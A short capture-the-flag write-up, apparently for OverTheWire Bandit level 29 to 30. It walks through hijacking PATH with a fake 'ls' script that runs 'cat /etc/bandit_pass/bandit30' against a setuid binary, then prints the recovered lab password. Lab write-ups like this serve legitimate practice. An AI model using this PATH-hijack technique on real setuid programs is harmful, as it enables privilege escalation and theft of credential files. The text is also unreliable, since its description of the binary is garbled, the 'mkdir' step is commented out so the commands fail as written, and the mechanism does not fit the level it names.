# Bandit Level 29 ➔ Level 30

## 🧠 Goal:
There’s a **setuid binary** called `bandit30` in the home directory.  
When run, it **executes whatever is in the environment variable `PATH`**, but it uses an **unsafe path configuration**.

You need to:
1. Create a malicious script named `ls`.
2. Manipulate the `PATH` variable to point to your script first.
3. Run the binary and capture the password.

---

## 🔐 Login:
```bash
ssh bandit29@bandit.labs.overthewire.org -p 2220
```

## 🛠️ Commands Used:
```bash
#mkdir /tmp/fakepath
echo '#!/bin/bash' > /tmp/fakepath/ls
echo 'cat /etc/bandit_pass/bandit30' >> /tmp/fakepath/ls
chmod +x /tmp/fakepath/ls
export PATH=/tmp/fakepath:$PATH
./bandit30
```

## 🧾 Password Found:
`b5Ycw5sTw7x9S7GkUD3fjwlhbEZHTBmw`

## 📘 What I Learned:
-How command injection can happen due to unsafe PATH usage.
-	The power of overriding system binaries in your custom path.
-	Why secure coding practices should avoid relying on user-controlled environments.
